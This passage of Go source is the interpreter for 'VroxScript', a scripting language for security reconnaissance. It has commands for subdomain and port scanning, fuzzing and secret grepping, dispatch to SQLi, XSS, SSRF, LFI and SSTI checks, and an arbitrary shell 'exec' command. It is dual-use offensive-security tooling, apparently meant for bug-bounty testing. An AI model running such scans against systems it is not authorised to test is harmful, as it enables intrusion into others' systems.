				continueSignal = false; variables[indexVar] = strconv.Itoa(j)
				runCode(strings.Join(block, "\n"), variables, debug)
				if breakSignal { breakSignal = false; break }
			}

		case strings.HasPrefix(line, "repeat "):
			parts := strings.Fields(line)
			count, _ := strconv.Atoi(resolveValue(parts[1], variables))
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			for j := 0; j < count; j++ {
				continueSignal = false; runCode(strings.Join(block, "\n"), variables, debug)
				if breakSignal { breakSignal = false; break }
			}

		case strings.HasPrefix(line, "for "):
			parts := strings.Fields(strings.TrimSuffix(line, " {"))
			varName, listName := parts[1], parts[3]
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			if items, ok := variables[listName].([]string); ok {
				for _, item := range items {
					continueSignal = false; variables[varName] = item
					runCode(strings.Join(block, "\n"), variables, debug)
					if breakSignal { breakSignal = false; break }
				}
			}

		case strings.HasPrefix(line, "func "):
			name := strings.TrimSpace(strings.TrimSuffix(strings.TrimPrefix(line, "func "), " {"))
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			variables["__func_"+name] = strings.Join(block, "\n")

		case strings.HasPrefix(line, "call "):
			parts := strings.Fields(line); name := parts[1]; args := parts[2:]
			if code, ok := variables["__func_"+name].(string); ok {
				localVars := map[string]interface{}{}
				for k, v := range variables { localVars[k] = v }
				for idx, arg := range args { localVars["arg"+strconv.Itoa(idx+1)] = resolveValue(arg, variables) }
				runCode(code, localVars, debug)
				for k, v := range localVars { if !strings.HasPrefix(k, "__func_") { variables[k] = v } }
			} else { vroxError("Unknown function: "+name, i+1) }

		case strings.HasPrefix(line, "try"):
			tryBlock, catchBlock := []string{}, []string{}
			i++; inCatch := false
			for i < len(lines) {
				l := strings.TrimSpace(lines[i])
				if l == "}" && !inCatch { if i+1 < len(lines) && strings.HasPrefix(strings.TrimSpace(lines[i+1]), "catch") { inCatch = true; i += 2; continue }; break
				} else if l == "}" && inCatch { break
				} else if inCatch { catchBlock = append(catchBlock, lines[i])
				} else { tryBlock = append(tryBlock, lines[i]) }
				i++
			}
			func() {
				defer func() { if r := recover(); r != nil { if len(catchBlock) > 0 { runCode(strings.Join(catchBlock, "\n"), variables, debug) } } }()
				runCode(strings.Join(tryBlock, "\n"), variables, debug)
			}()

		default:
			interpretLine(line, i+1, variables, debug, saveTo)
		}
		i++
	}
}

func interpretLine(line string, lineNum int, variables map[string]interface{}, debug bool, saveTo string) {
	switch {
	case line == "break": breakSignal = true
	case line == "continue": continueSignal = true

	// ---- API KEYS ----
	case strings.HasPrefix(line, "setkey "): parts := strings.Fields(line[7:]); if len(parts) == 2 { globalAPIKeys[parts[0]] = resolveExpression(parts[1], variables); vroxOrange("[apikey] Set " + parts[0]) }
	case strings.HasPrefix(line, "getkey "): key := strings.TrimSpace(line[7:]); if v, ok := globalAPIKeys[key]; ok { fmt.Println(v) }
	case line == "listkeys": for k := range globalAPIKeys { vroxOrange("[key] " + k + " = ***") }

	// ---- COLOR SYSTEM ----
	case strings.HasPrefix(line, "setcolor "):
		parts := strings.SplitN(line[9:], " ", 2)
		if len(parts) == 2 {
			name := strings.TrimSpace(parts[0])
			val := strings.ReplaceAll(strings.Trim(strings.TrimSpace(parts[1]), "\""), "\\033", "\033")
			variables["__color_"+name] = val; COLORS[name] = val; vroxInfo("[color] Set " + name)
		}
	case strings.HasPrefix(line, "getcolor "): name := strings.TrimSpace(line[9:]); if c, ok := COLORS[name]; ok { fmt.Println(c + name + COLORS["RESET"] + " = " + strconv.Quote(c)) }
	case line == "colors": for name, code := range COLORS { fmt.Println(code + name + COLORS["RESET"]) }

	case line == "banner":
		fmt.Println(COLORS["PURPLE"] + COLORS["BOLD"] + `
 __   __ ____   ___  __  __
 \ \ / /|  _ \ / _ \|  \/  |
  \ V / | |_) | | | | |\/| |
   | |  |  _ <| |_| | |  | |
   |_|  |_| \_\\___/|_|  |_|
` + COLORS["RESET"])
		fmt.Println(COLORS["CYAN"] + COLORS["BOLD"] + "  VroxScript " + VERSION + COLORS["RESET"])
		fmt.Println(COLORS["GREEN"] + "  github.com/InterviewCopilot350/vroxscript" + COLORS["RESET"])
		fmt.Println(COLORS["ORANGE"] + "  Built by Prince, India" + COLORS["RESET"])
		fmt.Println()

	// ---- VARIABLES ----
	case strings.HasPrefix(line, "let "):
		parts := strings.SplitN(line[4:], "=", 2)
		if len(parts) == 2 {
			name := strings.TrimSpace(parts[0]); val := strings.TrimSpace(parts[1])
			if strings.HasPrefix(val, "\"\"\"") { variables[name] = resolveExpression(val, variables)
			} else if strings.HasPrefix(val, "\"") { variables[name] = resolveExpression(val, variables)
			} else if val == "true" { variables[name] = true
			} else if val == "false" { variables[name] = false
			} else if val == "null" { variables[name] = nil
			} else if strings.ContainsAny(val, "+-*/%") { result := evalMath(val, variables)
				if result == float64(int(result)) { variables[name] = strconv.Itoa(int(result))
				} else { variables[name] = strconv.FormatFloat(result, 'f', 2, 64) }
			} else { if v, ok := variables[val]; ok { variables[name] = v } else { variables[name] = strings.Trim(val, "\"") } }
			if debug { fmt.Println(COLORS["BLUE"] + "[debug] Set " + name + " = " + fmt.Sprint(variables[name]) + COLORS["RESET"]) }
		}

	// ---- ASSERT / RAISE ----
	case strings.HasPrefix(line, "assert "):
		parts := strings.SplitN(line[7:], " ", 2)
		condition := parts[0]; msg := "Assertion failed"
		if len(parts) > 1 { msg = resolveExpression(parts[1], variables) }
		if !evalCondition(condition, variables) { vroxError("[ASSERT] "+msg, lineNum); os.Exit(1) }

	case strings.HasPrefix(line, "raise "): msg := resolveExpression(line[6:], variables); vroxError("[RAISED] "+msg, lineNum); os.Exit(1)

	// ---- TYPE CHECKING ----
	case strings.HasPrefix(line, "isnull "): varName := strings.TrimSpace(line[7:]); v := variables[varName]; result := v == nil; variables["isnull_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "islist "): varName := strings.TrimSpace(line[7:]); _, ok := variables[varName].([]string); variables["islist_result"] = strconv.FormatBool(ok); fmt.Println(ok)
	case strings.HasPrefix(line, "isdict "): varName := strings.TrimSpace(line[7:]); _, ok := variables[varName].(map[string]string); variables["isdict_result"] = strconv.FormatBool(ok); fmt.Println(ok)
	case strings.HasPrefix(line, "isnum "): val := resolveValue(line[6:], variables); _, err := strconv.ParseFloat(val, 64); result := err == nil; variables["isnum_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "isstr "): varName := strings.TrimSpace(line[6:]); _, ok := variables[varName].(string); variables["isstr_result"] = strconv.FormatBool(ok); fmt.Println(ok)
	case strings.HasPrefix(line, "isbool "): varName := strings.TrimSpace(line[7:]); _, ok := variables[varName].(bool); variables["isbool_result"] = strconv.FormatBool(ok); fmt.Println(ok)
	case strings.HasPrefix(line, "isnumber "): val := resolveExpression(line[9:], variables); _, err := strconv.ParseFloat(val, 64); result := err == nil; variables["isnumber_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "isalpha "): val := resolveExpression(line[8:], variables); result := regexp.MustCompile(`^[a-zA-Z]+$`).MatchString(val); variables["isalpha_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "isempty "): val := resolveExpression(line[8:], variables); result := strings.TrimSpace(val) == ""; variables["isempty_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "isip "): val := resolveExpression(line[5:], variables); result := net.ParseIP(val) != nil; variables["isip_result"] = strconv.FormatBool(result); fmt.Println(result)
	case strings.HasPrefix(line, "isdomain "): val := resolveExpression(line[9:], variables); result := regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9\-]{0,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$`).MatchString(val); variables["isdomain_result"] = strconv.FormatBool(result); fmt.Println(result)

	// ---- DICT ----
	case strings.HasPrefix(line, "dict "): parts := strings.SplitN(line[5:], "=", 2); variables[strings.TrimSpace(parts[0])] = map[string]string{}
	case strings.HasPrefix(line, "dictset "): parts := strings.Fields(line[8:]); if len(parts) == 3 { if d, ok := variables[parts[0]].(map[string]string); ok { d[strings.Trim(parts[1], "\"")] = resolveExpression(parts[2], variables); variables[parts[0]] = d } }
	case strings.HasPrefix(line, "dictget "): parts := strings.Fields(line[8:]); if len(parts) == 2 { if d, ok := variables[parts[0]].(map[string]string); ok { val := d[strings.Trim(parts[1], "\"")]; variables["dictget_result"] = val; fmt.Println(val) } }
	case strings.HasPrefix(line, "dictkeys "): dictName := strings.TrimSpace(line[9:]); if d, ok := variables[dictName].(map[string]string); ok { keys := []string{}; for k := range d { keys = append(keys, k) }; variables["dictkeys_result"] = keys; fmt.Println(keys) }

	// ---- OUTPUT ----
	case strings.HasPrefix(line, "out "): fmt.Println(resolveExpression(strings.TrimSpace(line[4:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "print "): fmt.Println(resolveExpression(strings.TrimSpace(line[6:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "warn "): fmt.Println(COLORS["YELLOW"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "error "): fmt.Println(COLORS["RED"] + resolveExpression(strings.TrimSpace(line[6:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "success "): fmt.Println(COLORS["GREEN"] + resolveExpression(strings.TrimSpace(line[8:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "info "): fmt.Println(COLORS["CYAN"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "bold "): fmt.Println(COLORS["BOLD"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "orange "): fmt.Println(COLORS["ORANGE"] + resolveExpression(strings.TrimSpace(line[7:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "pink "): fmt.Println(COLORS["PINK"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "gold "): fmt.Println(COLORS["GOLD"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "teal "): fmt.Println(COLORS["TEAL"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "lime "): fmt.Println(COLORS["LIME"] + resolveExpression(strings.TrimSpace(line[5:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "violet "): fmt.Println(COLORS["VIOLET"] + resolveExpression(strings.TrimSpace(line[7:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "coral "): fmt.Println(COLORS["CORAL"] + resolveExpression(strings.TrimSpace(line[6:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "silver "): fmt.Println(COLORS["SILVER"] + resolveExpression(strings.TrimSpace(line[7:]), variables) + COLORS["RESET"])
	case strings.HasPrefix(line, "maroon "): fmt.Println(COLORS["MAROON"] + resolveExpression(strings.TrimSpace(line[7:]), variables) + COLORS["RESET"])

	case line == "divider": fmt.Println(COLORS["DIM"] + strings.Repeat("─", 60) + COLORS["RESET"])
	case line == "newline": fmt.Println()

	// ---- TABLE OUTPUT ----
	case strings.HasPrefix(line, "table "):
		parts := strings.Fields(line[6:])
		if len(parts) >= 2 {
			headersVar := parts[0]; dataVar := parts[1]
			headers := []string{}
			if h, ok := variables[headersVar].([]string); ok { headers = h }
			rows := [][]string{}
			if d, ok := variables[dataVar].([]string); ok {
				for _, row := range d { rows = append(rows, strings.Split(row, "|")) }
			}
			printTable(headers, rows)
		}

	// ---- PROGRESS BAR ----
	case strings.HasPrefix(line, "progress "):
		parts := strings.Fields(line[9:])
		if len(parts) >= 2 {
			current, _ := strconv.Atoi(resolveValue(parts[0], variables))
			total, _ := strconv.Atoi(resolveValue(parts[1], variables))
			label := ""
			if len(parts) > 2 { label = resolveExpression(strings.Join(parts[2:], " "), variables) }
			printProgress(current, total, label)
		}

	// ---- SPINNER ----
	case strings.HasPrefix(line, "spinner "):
		parts := strings.SplitN(line[8:], " ", 2)
		msg := resolveExpression(parts[0], variables)
		duration := 2000
		if len(parts) > 1 { duration, _ = strconv.Atoi(resolveValue(parts[1], variables)) }
		spinner(msg, duration)

	// ---- ASK ----
	case strings.HasPrefix(line, "ask "):
		question := resolveExpression(line[4:], variables)
		fmt.Print(COLORS["YELLOW"] + question + " [y/n]: " + COLORS["RESET"])
		reader := bufio.NewReader(os.Stdin)
		answer, _ := reader.ReadString('\n')
		answer = strings.TrimSpace(strings.ToLower(answer))
		variables["ask_result"] = answer
		variables["ask_yes"] = strconv.FormatBool(answer == "y" || answer == "yes")
		fmt.Println(answer)

	// ---- TIME ----
	case line == "now": now := time.Now().Format("2006-01-02 15:04:05"); variables["now"] = now; fmt.Println(now)
	case line == "date": d := time.Now().Format("2006-01-02"); variables["date"] = d; fmt.Println(d)
	case line == "time": t := time.Now().Format("15:04:05"); variables["time"] = t; fmt.Println(t)
	case line == "elapsed": elapsed := time.Since(scriptStartTime).Seconds(); variables["elapsed"] = strconv.FormatFloat(elapsed, 'f', 2, 64); fmt.Println(strconv.FormatFloat(elapsed, 'f', 2, 64) + "s")
	case strings.HasPrefix(line, "timestamp"): now := time.Now().Format("2006-01-02 15:04:05"); variables["timestamp_result"] = now; fmt.Println(now)

	// ---- NETWORK ----
	case strings.HasPrefix(line, "ping "): host := resolveValue(line[5:], variables); result := pingHost(host); variables["ping_result"] = strconv.FormatBool(result)

	case strings.HasPrefix(line, "banner_grab "):
		parts := strings.Fields(line[12:])
		if len(parts) == 2 {
			host := resolveValue(parts[0], variables)
			port, _ := strconv.Atoi(resolveValue(parts[1], variables))
			result := grabBanner(host, port)
			variables["banner_result"] = result
			if saveTo != "" { saveToFile(saveTo, result) }
		}

	case strings.HasPrefix(line, "cidr "):
		cidr := resolveValue(line[5:], variables)
		results := expandCIDR(cidr)
		variables["cidr_result"] = results
		if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "favicon "):
		targetURL := resolveValue(line[8:], variables)
		result := getFaviconHash(targetURL)
		variables["favicon_hash"] = result
		if saveTo != "" { saveToFile(saveTo, result) }

	case strings.HasPrefix(line, "cdn "):
		domain := resolveValue(line[4:], variables)
		result := detectCDN(domain)
		variables["cdn_result"] = result
		if saveTo != "" { saveToFile(saveTo, result) }

	// ---- INPUT ----
	case strings.HasPrefix(line, "input "): varName := strings.TrimSpace(line[6:]); fmt.Print(COLORS["CYAN"] + varName + ": " + COLORS["RESET"]); reader := bufio.NewReader(os.Stdin); val, _ := reader.ReadString('\n'); variables[varName] = strings.TrimSpace(val)

	// ---- SYSTEM ----
	case strings.HasPrefix(line, "sleep "): ms, _ := strconv.Atoi(resolveValue(line[6:], variables)); time.Sleep(time.Duration(ms) * time.Millisecond)
	case strings.HasPrefix(line, "exec "): cmd := resolveExpression(line[5:], variables); out, err := exec.Command("sh", "-c", cmd).Output(); if err == nil { result := strings.TrimSpace(string(out)); variables["exec_result"] = result; fmt.Println(result) } else { fmt.Println(COLORS["RED"] + "[exec] Failed: " + err.Error() + COLORS["RESET"]) }
	case strings.HasPrefix(line, "env "): varName := strings.TrimSpace(line[4:]); val := os.Getenv(varName); variables["env_"+varName] = val; fmt.Println(val)
	case line == "args": variables["args"] = os.Args; fmt.Println(os.Args)
	case line == "clear": fmt.Print("\033[2J\033[H")
	case strings.HasPrefix(line, "import "): importFile(strings.TrimSpace(line[7:]), variables, debug)

	// ---- HTTP SETTINGS ----
	case strings.HasPrefix(line, "setheader "): parts := strings.SplitN(line[10:], " ", 2); if len(parts) == 2 { globalHeaders[strings.Trim(parts[0], "\"")] = resolveExpression(parts[1], variables); vroxInfo("[header] Set " + parts[0]) }
	case strings.HasPrefix(line, "setcookie "): parts := strings.SplitN(line[10:], " ", 2); if len(parts) == 2 { globalCookies[strings.Trim(parts[0], "\"")] = resolveExpression(parts[1], variables); vroxInfo("[cookie] Set " + parts[0]) }
	case line == "clearcookies": globalCookies = map[string]string{}; vroxInfo("[cookies] Cleared")
	case line == "clearheaders": globalHeaders = map[string]string{}; vroxInfo("[headers] Cleared")

	// ---- SECURITY COMMANDS ----
	case strings.HasPrefix(line, "resolve "): domain := resolveValue(line[8:], variables); ips, err := net.LookupHost(domain); if err == nil { variables["resolved_ip"] = ips[0]; vroxSuccess("[resolve] " + domain + " -> " + ips[0]); if saveTo != "" { saveToFile(saveTo, ips[0]) } } else { variables["resolved_ip"] = ""; fmt.Println(COLORS["RED"] + "[resolve] " + domain + " -> failed" + COLORS["RESET"]) }

	case strings.HasPrefix(line, "scan subdomains "):
		parts := strings.Fields(line[16:])
		domain := resolveValue(parts[0], variables)
		wordlistFile := ""; passive := true
		for idx, p := range parts {
			if p == "wordlist" && idx+1 < len(parts) { wordlistFile = resolveValue(parts[idx+1], variables) }
			if p == "nopassive" { passive = false }
		}
		vroxPurple("[scan] Starting reconnaissance for " + domain + "...")
		results := scanSubdomains(domain, wordlistFile, passive)
		variables["scan_results"] = results
		vroxSuccess("[scan] Total: " + strconv.Itoa(len(results)))
		if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "probe "):
		varName := strings.TrimSpace(line[6:])
		hosts := []string{}
		if h, ok := variables[varName].([]string); ok { hosts = h }
		results := probeHosts(hosts)
		alive := []string{}
		for _, r := range results { alive = append(alive, r.Host+" -> "+strconv.Itoa(r.StatusCode)+" | "+r.Title+" | "+strconv.FormatInt(r.ResponseMs, 10)+"ms") }
		variables["probe_results"] = alive; variables["alive_results"] = alive
		if saveTo != "" { saveToFile(saveTo, strings.Join(alive, "\n")) }

	case strings.HasPrefix(line, "alive "):
		varName := strings.TrimSpace(line[6:])
		if hosts, ok := variables[varName].([]string); ok {
			results := checkAlive(hosts); variables["alive_results"] = results
			if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
		}

	case strings.HasPrefix(line, "ports "):
		parts := strings.Fields(line[6:]); host := resolveValue(parts[0], variables)
		customPorts := []int{}
		if len(parts) > 1 { for _, p := range strings.Split(parts[1], ",") { port, _ := strconv.Atoi(p); if port > 0 { customPorts = append(customPorts, port) } } }
		vroxInfo("[ports] Scanning " + host + "...")
		results := scanPorts(host, customPorts); variables["port_results"] = results
		if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "headers "): targetURL := resolveValue(line[8:], variables); results := grabHeaders(targetURL); variables["header_results"] = results; if saveTo != "" { content := ""; for k, v := range results { content += k + ": " + v + "\n" }; saveToFile(saveTo, content) }
	case strings.HasPrefix(line, "secheaders "): targetURL := resolveValue(line[11:], variables); missing, present := checkSecHeaders(targetURL); variables["missing_headers"] = missing; variables["present_headers"] = present; if saveTo != "" { saveToFile(saveTo, "Missing: "+strings.Join(missing, ", ")) }
	case strings.HasPrefix(line, "dns "): domain := resolveValue(line[4:], variables); results := dnsLookup(domain); variables["dns_results"] = results; if saveTo != "" { content := ""; for k, v := range results { content += k + ": " + v + "\n" }; saveToFile(saveTo, content) }

	case strings.HasPrefix(line, "fetch get "): targetURL := resolveValue(line[10:], variables); status, body, _ := fetchPage(targetURL); variables["fetch_status"] = status; variables["fetch_body"] = body; variables["fetch_status_str"] = strconv.Itoa(status); if saveTo != "" { saveToFile(saveTo, strconv.Itoa(status)) }

	case strings.HasPrefix(line, "fetch post "):
		parts := strings.SplitN(line[11:], " ", 2); targetURL := resolveValue(parts[0], variables); data := url.Values{}
		if len(parts) > 1 { for _, p := range strings.Split(parts[1], "&") { kv := strings.SplitN(p, "=", 2); if len(kv) == 2 { data.Set(resolveValue(kv[0], variables), resolveValue(kv[1], variables)) } } }
		resp, err := httpClientFollow.PostForm(targetURL, data)
		if err == nil { defer resp.Body.Close(); buf := make([]byte, 5000); n, _ := resp.Body.Read(buf); variables["fetch_status"] = resp.StatusCode; variables["fetch_body"] = string(buf[:n]); vroxSuccess("[post] " + targetURL + " -> " + strconv.Itoa(resp.StatusCode)) }

	case strings.HasPrefix(line, "crawl "): targetURL := resolveValue(line[6:], variables); results := crawlLinks(targetURL); variables["crawl_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "js "): targetURL := resolveValue(line[3:], variables); results := extractJSUrls(targetURL); variables["js_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "wayback "): domain := resolveValue(line[8:], variables); results := waybackLookup(domain); variables["wayback_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "fuzz "):
		parts := strings.Fields(line[5:]); targetURL := resolveValue(parts[0], variables)
		wordlistFile := ""; filterStatus := []int{}; filterSize := 0; threads := 50; method := "GET"; postData := ""
		for idx, p := range parts {
			if p == "wordlist" && idx+1 < len(parts) { wordlistFile = resolveValue(parts[idx+1], variables) }
			if p == "filter-status" && idx+1 < len(parts) { for _, s := range strings.Split(parts[idx+1], ",") { code, _ := strconv.Atoi(s); if code > 0 { filterStatus = append(filterStatus, code) } } }
			if p == "filter-size" && idx+1 < len(parts) { filterSize, _ = strconv.Atoi(parts[idx+1]) }
			if p == "threads" && idx+1 < len(parts) { threads, _ = strconv.Atoi(parts[idx+1]) }
			if p == "method" && idx+1 < len(parts) { method = parts[idx+1] }
			if p == "data" && idx+1 < len(parts) { postData = resolveValue(parts[idx+1], variables) }
		}
		results := fuzzAdvanced(targetURL, wordlistFile, filterStatus, filterSize, threads, method, postData)
		fuzzStrings := []string{}
		for _, r := range results { fuzzStrings = append(fuzzStrings, r.URL+" ["+strconv.Itoa(r.StatusCode)+"] [size:"+strconv.Itoa(r.Size)+"]") }
		variables["fuzz_results"] = fuzzStrings
		if saveTo != "" { saveToFile(saveTo, strings.Join(fuzzStrings, "\n")) }

	case strings.HasPrefix(line, "secrets "): varName := strings.TrimSpace(line[8:]); results := grepSecrets(fmt.Sprint(variables[varName])); variables["secrets_found"] = results; if saveTo != "" { saveToFile(saveTo, fmt.Sprint(results)) }
	case strings.HasPrefix(line, "takeover "): domain := resolveValue(line[9:], variables); subdomains, _ := variables["scan_results"].([]string); results := checkSubdomainTakeover(domain, subdomains); variables["takeover_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "corscheck "): results := checkCORS(resolveValue(line[10:], variables)); variables["cors_results"] = results
	case strings.HasPrefix(line, "ssl "): results := checkSSL(resolveValue(line[4:], variables)); variables["ssl_results"] = results; if saveTo != "" { content := ""; for k, v := range results { content += k + ": " + v + "\n" }; saveToFile(saveTo, content) }
	case strings.HasPrefix(line, "techdetect "): results := detectTech(resolveValue(line[11:], variables)); variables["tech_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "emails "): results := extractEmails(resolveValue(line[7:], variables)); variables["email_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "whois "): result := ""; variables["whois_result"] = result
	case strings.HasPrefix(line, "ratelimit "): results := checkRateLimit(resolveValue(line[10:], variables)); variables["ratelimit_results"] = results
	case strings.HasPrefix(line, "openredirect "): results := checkOpenRedirect(resolveValue(line[13:], variables)); variables["openredirect_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "sqli "):
		parts := strings.Fields(line[5:])
		if len(parts) >= 2 {
			results := checkSQLiAdvanced(resolveValue(parts[0], variables), resolveValue(parts[1], variables))
			variables["sqli_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
		}

	case strings.HasPrefix(line, "xsscheck "):
		parts := strings.Fields(line[9:])
		if len(parts) >= 2 {
			results := checkXSSAdvanced(resolveValue(parts[0], variables), resolveValue(parts[1], variables))
			variables["xss_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
		}

	case strings.HasPrefix(line, "mineParams "):
		targetURL := resolveValue(line[11:], variables)
		results := mineParams(targetURL); variables["param_results"] = results
		if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }

	case strings.HasPrefix(line, "ssrf "): parts := strings.Fields(line[5:]); if len(parts) >= 2 { results := checkSSRF(resolveValue(parts[0], variables), resolveValue(parts[1], variables)); variables["ssrf_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) } }
	case strings.HasPrefix(line, "lfi "): parts := strings.Fields(line[4:]); if len(parts) >= 2 { results := checkLFI(resolveValue(parts[0], variables), resolveValue(parts[1], variables)); variables["lfi_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) } }
	case strings.HasPrefix(line, "crlf "): results := checkCRLF(resolveValue(line[5:], variables)); variables["crlf_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) }
	case strings.HasPrefix(line, "ssti "): parts := strings.Fields(line[5:]); if len(parts) >= 2 { results := checkSSTI(resolveValue(parts[0], variables), resolveValue(parts[1], variables)); variables["ssti_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) } }
	case strings.HasPrefix(line, "timing "): parts := strings.Fields(line[7:]); targetURL := resolveValue(parts[0], variables); count := 5; if len(parts) > 1 { count, _ = strconv.Atoi(parts[1]) }; results := measureResponseTime(targetURL, count); variables["timing_results"] = results

	case strings.HasPrefix(line, "grep "): parts := strings.SplitN(line[5:], " ", 2); if len(parts) == 2 { content := fmt.Sprint(variables[parts[0]]); keyword := resolveExpression(parts[1], variables); if strings.Contains(strings.ToLower(content), strings.ToLower(keyword)) { vroxSuccess("[grep] Found: " + keyword); variables["grep_result"] = "true" } else { fmt.Println(COLORS["RED"] + "[grep] Not found: " + keyword + COLORS["RESET"]); variables["grep_result"] = "false" } }
	case strings.HasPrefix(line, "regex "): parts := strings.SplitN(line[6:], " ", 2); if len(parts) == 2 { results := regexSearch(strings.Trim(parts[0], "\""), fmt.Sprint(variables[strings.TrimSpace(parts[1])])); variables["regex_result"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) } }

	case strings.HasPrefix(line, "template "): parts := strings.Fields(line[9:]); if len(parts) >= 2 { tmpl, err := loadTemplate(resolveValue(parts[0], variables)); if err == nil { matched, extracted := runTemplate(tmpl, resolveValue(parts[1], variables)); variables["template_match"] = strconv.FormatBool(matched); variables["template_extracted"] = extracted; if matched { vroxSuccess("[template] MATCH: " + tmpl.Name) } } }
	case strings.HasPrefix(line, "templates "): parts := strings.Fields(line[10:]); if len(parts) >= 2 { results := runTemplatesDir(resolveValue(parts[0], variables), resolveValue(parts[1], variables)); variables["template_results"] = results; if saveTo != "" { saveToFile(saveTo, strings.Join(results, "\n")) } }

	case strings.HasPrefix(line, "report "): target := resolveValue(line[7:], variables); content := generateReport(target, variables); fmt.Println(content); if saveTo != "" { saveToFile(saveTo, content); vroxSuccess("[report] Saved to " + saveTo) }

	// ---- FILE COMMANDS ----
	case strings.HasPrefix(line, "save "): parts := strings.SplitN(line[5:], " ", 2); if len(parts) == 2 { saveToFile(parts[0], resolveExpression(parts[1], variables)) }
	case strings.HasPrefix(line, "show "): filename := resolveValue(line[5:], variables); data, err := os.ReadFile(filename); if err == nil { fmt.Println(string(data)) } else { fmt.Println(COLORS["RED"] + "[show] Cannot open: " + filename + COLORS["RESET"]) }
	case strings.HasPrefix(line, "read "): filename := resolveValue(line[5:], variables); data, err := os.ReadFile(filename); if err == nil { variables["read_result"] = string(data); fmt.Println(string(data)) } else { vroxError("Cannot read: "+filename, lineNum) }
	case strings.HasPrefix(line, "append "): parts := strings.SplitN(line[7:], " ", 2); if len(parts) == 2 { f, err := os.OpenFile(parts[0], os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err == nil { f.WriteString(resolveExpression(parts[1], variables) + "\n"); f.Close(); vroxInfo("[append] Written to " + parts[0]) } }
	case strings.HasPrefix(line, "delete "): os.Remove(resolveValue(line[7:], variables)); vroxSuccess("[delete] Removed")
	case strings.HasPrefix(line, "exists "): filename := resolveValue(line[7:], variables); if _, err := os.Stat(filename); err == nil { vroxSuccess("[exists] yes"); variables["exists_result"] = "true" } else { fmt.Println(COLORS["RED"] + "[exists] no" + COLORS["RESET"]); variables["exists_result"] = "false" }
	case strings.HasPrefix(line, "lines "): filename := resolveValue(line[6:], variables); data, err := os.ReadFile(filename); if err == nil { linesList := strings.Split(strings.TrimSpace(string(data)), "\n"); variables["lines_result"] = linesList; fmt.Println(len(linesList), "lines") }
	case strings.HasPrefix(line, "mkdir "): os.MkdirAll(resolveValue(line[6:], variables), 0755); vroxSuccess("[mkdir] Created")
	case strings.HasPrefix(line, "listdir "): dirName := resolveValue(line[8:], variables); entries, err := os.ReadDir(dirName); if err == nil { files := []string{}; for _, e := range entries { files = append(files, e.Name()); fmt.Println(COLORS["CYAN"] + "[listdir] " + e.Name() + COLORS["RESET"]) }; variables["listdir_result"] = files }
	case strings.HasPrefix(line, "copyfile "): parts := strings.Fields(line[9:]); if len(parts) == 2 { data, err := os.ReadFile(resolveValue(parts[0], variables)); if err == nil { os.WriteFile(resolveValue(parts[1], variables), data, 0644); vroxSuccess("[copyfile] Done") } }
	case strings.HasPrefix(line, "movefile "): parts := strings.Fields(line[9:]); if len(parts) == 2 { os.Rename(resolveValue(parts[0], variables), resolveValue(parts[1], variables)); vroxSuccess("[movefile] Done") }
